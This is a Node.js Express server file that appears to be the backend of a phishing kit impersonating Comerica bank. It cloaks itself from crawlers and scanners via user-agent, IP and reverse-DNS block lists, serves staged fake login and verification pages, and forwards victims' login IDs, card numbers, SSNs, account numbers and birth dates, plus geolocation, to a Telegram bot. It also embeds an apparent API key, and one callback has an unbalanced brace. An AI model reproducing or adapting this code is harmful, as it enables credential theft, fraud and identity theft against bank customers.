const express = require('express');
const app = express();
const dns = require('dns');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs').promises;
const axios = require('axios');
const MobileDetect = require('mobile-detect');
const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const UAParser = require('ua-parser-js');
const { crawlerUserAgents } = require('crawler-user-agents');
const { botToken, chatId, redirect_url } = require('./config/settings.js');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');
const { sendMessageFor } = require('simple-telegram-message');
const botBlock = require('./config/botBlocker.js'); // Import botBlock as an array
const blockedHost = require('./path/to/blockedHost.js');
const viewDir = path.join(__dirname, 'views');

// Middleware for IP and bot detection
function getClientIp(req) {
  const xForwardedFor = req.headers['x-forwarded-for'];
  return xForwardedFor ? xForwardedFor.split(',')[0].trim() : req.connection.remoteAddress || req.socket.remoteAddress;
}

function isBotUA(userAgent) {
  if (!userAgent) return false;
  return (
    isbot(userAgent) || 
    botUAList.some(bot => userAgent.toLowerCase().includes(bot)) || 
    botBlock.some(bot => new RegExp(bot, 'i').test(userAgent)) // Using RegExp for botBlock patterns
  );
}

function isBotIP(ipAddress) {
  if (!ipAddress) return false;
  ipAddress = ipAddress.substr(0, 7) === '::ffff:' ? ipAddress.substr(7) : ipAddress;

  const IPtoNum = ip => ip.split('.').map(d => ('000' + d).substr(-3)).join('');
  return (
    botIPList.some(botIP => ipAddress.includes(botIP)) ||
    botIPRangeList.some(([min, max]) => IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)) ||
    botIPCIDRRangeList.some(cidr => ipRangeCheck(ipAddress, cidr)) ||
    botIPWildcardRangeList.some(pattern => ipAddress.match(pattern) !== null)
  );
}

function isBotRef(referer) {
  return botRefList.some(ref => referer && referer.toLowerCase().includes(ref));
}

// Combined Bot detection middleware
const isCrawler = (userAgent) => {
    return crawlerUserAgents.some(crawler =>
        new RegExp(crawler.pattern, 'i').test(userAgent)
    );
};


const detectBotMiddleware = (req, res, next) => {
    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || "Unknown User-Agent";

    // Parse the User-Agent string
    const parser = new UAParser();
    const uaResult = parser.setUA(userAgent).getResult();

    // Extract OS and browser information
    const os = uaResult.os.name || "Unknown OS Platform";
    const browser = uaResult.browser.name || "Unknown Browser";

    console.log(`Detected IP: ${ip}, OS: ${os}, Browser: ${browser}, User-Agent: ${userAgent}`);

    if (isCrawler(userAgent)) {
        console.log(`Blocked crawler: User-Agent: ${userAgent}, IP: ${ip}`);
        return res.status(403).send('Crawlers are not allowed');
    }
    
    dns.reverse(ip, (err, hostnames) => {
        if (err) {
            console.error('Error resolving hostname:', err);
            return next(); // Continue if hostname can't be resolved
        }

        // Check if any hostname contains blocked words
        const isBlocked = hostnames.some(hostname =>
            blockedHost.some(word => hostname.toLowerCase().includes(word))
        );

        if (isBlocked) {
            console.log(`Blocked request from hostname: ${hostnames.join(', ')}`);
            return res.status(404).send('Not found');
        }
    
    // Your blocking logic
    if (
        ip === "92.23.57.168" ||
        ip === "96.31.1.4" ||
        ip === "207.96.148.8" ||
        (os === "Windows Server 2003/XP x64" && browser === "Firefox") ||
        (os === "Windows 7" && browser === "Firefox") ||
        (os === "Windows XP" && ["Firefox", "Internet Explorer", "Chrome"].includes(browser)) ||
        (os === "Windows Vista" && browser === "Internet Explorer") ||
        ["Windows Vista", "Ubuntu", "Chrome OS", "BlackBerry", "Linux"].includes(os) ||
        browser === "Internet Explorer" ||
        os === "Windows 2000" ||
        os === "Unknown OS Platform" ||
        browser === "Unknown Browser"
    ){
        console.log(`Blocked request: IP: ${ip}, OS: ${os}, Browser: ${browser}`);
        return res.redirect("https://office.com");
    }

    next();
};

// Apply Bot Detection Middleware
app.use(detectBotMiddleware);

// Body parser and static file serving
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.set('trust proxy', true);

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));

// API request for geo-location
async function sendAPIRequest(ipAddress) {
  const response = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=bdc_4422bb94409c46e986818d3e9f3b2bc2`);
  return response.data;
}

// Route for form submission
app.post('/receive', async (req, res) => {
  let message = '';
  const myObject = req.body;

  try {
    const ipAddress = getClientIp(req);
    const geoInfo = await sendAPIRequest(ipAddress);
    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];
    
    const myObjectKeys = Object.keys(myObject).map(key => key.toLowerCase());
    const fullGeoInfo = `🌍 GEO-IP INFO\nIP: ${geoInfo.ip}\nCoordinates: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}\nCity: ${geoInfo.location.city}\nState: ${geoInfo.location.principalSubdivision}\nZIP: ${geoInfo.location.postcode}\nCountry: ${geoInfo.country.name}\nTime: ${geoInfo.location.timeZone.localTime}\nISP: ${geoInfo.network.organisation}\n\n`;
    const basicGeoInfo = `🌍 GEO-IP INFO\nIP: ${geoInfo.ip}\nCoordinates: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}\n\n`;

    const prepareMessage = (header, type, includeFullGeo = false) => {
      message += `👤 ${header}\n========================\n`;
      Object.keys(myObject).forEach(key => {
        if (key.toLowerCase() !== 'visitor' && myObject[key]) {
          message += `${key.toUpperCase()}: ${myObject[key]}\n`;
        }
      });
      message += `\n========================\n\n` + (includeFullGeo ? fullGeoInfo : basicGeoInfo) + `========================\n\n✅ UPDATE TEAM | COMERICA\n💬 Telegram: https://t.me/updteams\n`;

      res.send({ url: type });
    };

    if (myObjectKeys.includes('userid')) {
      prepareMessage("LOGIN", "/verify?action=1", true);
    } else if (myObjectKeys.includes('city') || myObjectKeys.includes('zipcode') || myObjectKeys.includes('cardnumber')) {
      prepareMessage("BILLING INFO", redirect_url, false);
    } else if (myObjectKeys.includes('ssn') || myObjectKeys.includes('accountnumber') || myObjectKeys.includes('email')) {
      prepareMessage("ACCOUNT INFO", "/verify?action=3", false);
    } else if (myObjectKeys.includes('dob')) {
      prepareMessage("ACCOUNT INFO", "/verify?action=2", false);
    } else {
      res.status(400).send({ error: "No matching keys found in request body." });
    }

    const sendMessage = sendMessageFor(botToken, chatId);
    await sendMessage(message);
    console.log(message);

  } catch (error) {
    res.status(500).send({ error: "Internal server error" });
    console.error(error);
  }
});

// Route for login
app.get('/login', async (req, res) => {
  try {
    const htmlContent = await fs.readFile(path.join(viewDir, 'Index.html'), 'utf-8');
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Route for verify page
app.get('/verify', (req, res) => { 
  const action = req.query.action;
  const verifyPages = {
    '1': 'enroll.html',
    '2': 'acc.html',
    '3': 'card.html'
  };

  const page = verifyPages[action] || 'login';
  res.sendFile(path.join(viewDir, page));
});

// Default route
app.get('/', (req, res) => res.redirect('/login')); 